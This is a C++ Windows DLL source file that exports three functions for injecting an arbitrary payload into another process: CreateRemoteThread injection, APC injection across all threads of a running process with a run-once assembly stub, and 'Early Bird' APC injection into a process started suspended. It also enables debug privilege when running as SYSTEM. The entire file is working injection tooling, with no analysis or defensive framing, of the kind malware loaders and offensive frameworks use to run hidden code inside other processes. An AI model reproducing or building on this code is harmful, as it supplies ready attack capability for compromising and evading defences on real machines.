// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <sddl.h>

#define STEP(cb, name, idx) if ((cb) != NULL) (cb)(name, idx)

BOOL EnableDebugPrivilege();
PSID GetProcessSID(HANDLE hProcess);
BOOL IsSystemUser();

typedef void (*StepCallback)(const char* stepName, int stepIndex);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

BOOL QueueApcToProcess(DWORD targetPid, LPVOID payloadAddr) {
    HANDLE hSnapshot;
    THREADENTRY32 te32;
    int queuedCount = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (te32.th32OwnerProcessID == targetPid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);

            if (hThread != NULL) {
                if (QueueUserAPC((PAPCFUNC)payloadAddr, hThread, 0)) {
                    queuedCount++;
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    return (queuedCount > 0);
}

extern "C" __declspec(dllexport) int InjectPayloadSimple(DWORD pid, unsigned char* payload, unsigned int length, StepCallback callback)
{
    HANDLE hProcess;
    HANDLE hThread;
    PVOID remoteBuffer;

    if (IsSystemUser()) {
        EnableDebugPrivilege();
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return -1;
    }
    else {
        STEP(callback, "OpenProcess", 0);
    }
        
    

    remoteBuffer = VirtualAllocEx(hProcess, NULL, length, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return -2;
    }
    else {
        STEP(callback, "VirtualAllocEx", 1);
    }
    

    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, length, NULL)) {
        CloseHandle(hProcess);
        return -3;
    }
    else {
        STEP(callback, "WriteProcessMemory", 2);
    }
    

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProcess);
        return -4;
    }
    else {
        STEP(callback, "CreateRemoteThread", 3);
    }
    

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

extern "C" __declspec(dllexport) int InjectPayloadApcMultiThreaded(DWORD pid, unsigned char* payload, SIZE_T length, StepCallback callback) {
    HANDLE hProcess;
    LPVOID blockMem;
    SIZE_T bytesWritten;

    unsigned char stub[] = {
        0x4C, 0x8D, 0x05, 0xF1, 0xFF, 0xFF, 0xFF,   // lea r8, [rip - 0x0F]
        0x31, 0xC0,                                   // xor eax, eax
        0xBA, 0x01, 0x00, 0x00, 0x00,                 // mov edx, 1
        0xF0, 0x41, 0x0F, 0xB1, 0x10,                 // lock cmpxchg [r8], edx
        0x75, 0x02,                                   // jnz +2 (to ret)
        0xEB, 0x01,                                   // jmp +1 (to payload)
        0xC3                                          // ret
    };

    SIZE_T flagSize = 8;
    SIZE_T stubSize = sizeof(stub);
    SIZE_T totalSize = flagSize + stubSize + length;

    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        return -1;
    } else {
        STEP(callback, "OpenProcess", 0);
    }

    blockMem = VirtualAllocEx(
        hProcess,
        NULL,
        totalSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (blockMem == NULL) {
        CloseHandle(hProcess);
        return -1;
    } else {
        STEP(callback, "VirtualAllocEx", 1);
    }

    LONG64 zero = 0;
    if (!WriteProcessMemory(hProcess, blockMem, &zero, sizeof(zero), &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    } else {
        STEP(callback, "WriteProcessMemory", 2);
    }

    LPVOID stubAddr = (BYTE*)blockMem + flagSize;
    if (!WriteProcessMemory(hProcess, stubAddr, stub, stubSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    LPVOID payloadAddr = (BYTE*)stubAddr + stubSize;
    if (!WriteProcessMemory(hProcess, payloadAddr, payload, length, &bytesWritten)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    if (bytesWritten != length) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    if (!QueueApcToProcess(pid, stubAddr)) {
        VirtualFreeEx(hProcess, blockMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    } else {
        STEP(callback, "QueueUserAPC", 3);
    }

    CloseHandle(hProcess);
    return 0;
}

extern "C" __declspec(dllexport) int InjectPayloadApcEarlyBird(const char* targetExe, unsigned char* payload, SIZE_T length, StepCallback callback) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    LPVOID blockMem;
    SIZE_T bytesWritten;


    si.cb = sizeof(si);

    if (!CreateProcessA(
        targetExe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return -1;
    } else {
        STEP(callback, "CreateProcessA", 0);
    }

    blockMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        length,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (blockMem == NULL) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -2;
    } else {
        STEP(callback, "VirtualAllocEx", 1);
    }

    if (!WriteProcessMemory(pi.hProcess, blockMem, payload, length, &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -3;
    }

    if (bytesWritten != length) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -4;
    } else {
        STEP(callback, "WriteProcessMemory", 2);
    }

    if (!QueueUserAPC((PAPCFUNC)blockMem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, blockMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -5;
    } else {
        STEP(callback, "QueueUserAPC", 3);
    }

    ResumeThread(pi.hThread);
    STEP(callback, "ResumeThread", 4);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL res = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return res && (GetLastError() == ERROR_SUCCESS);
}

PSID GetProcessSID(HANDLE hProcess) {
    HANDLE hToken;
    DWORD dwLength = 0;
    PTOKEN_USER pTokenUser = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return NULL;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, dwLength);
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {
        PSID pSid = (PSID)HeapAlloc(GetProcessHeap(), 0, GetLengthSid(pTokenUser->User.Sid));
        CopySid(GetLengthSid(pTokenUser->User.Sid), pSid, pTokenUser->User.Sid);
        HeapFree(GetProcessHeap(), 0, pTokenUser);
        CloseHandle(hToken);
        return pSid;
    }
    CloseHandle(hToken);
    return NULL;
}

BOOL IsSystemUser() {
    HANDLE hToken;
    UCHAR tokenInfo[MAX_PATH];
    DWORD dwLength = 0;
    BOOL isSystem = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenUser, tokenInfo, sizeof(tokenInfo), &dwLength)) {
            PSID systemSid = NULL;
            if (ConvertStringSidToSidA("S-1-5-18", &systemSid)) {
                if (EqualSid(((PTOKEN_USER)tokenInfo)->User.Sid, systemSid)) {
                    isSystem = TRUE;
                }
                LocalFree(systemSid);
            }
        }
        CloseHandle(hToken);
    }
    return isSystem;
}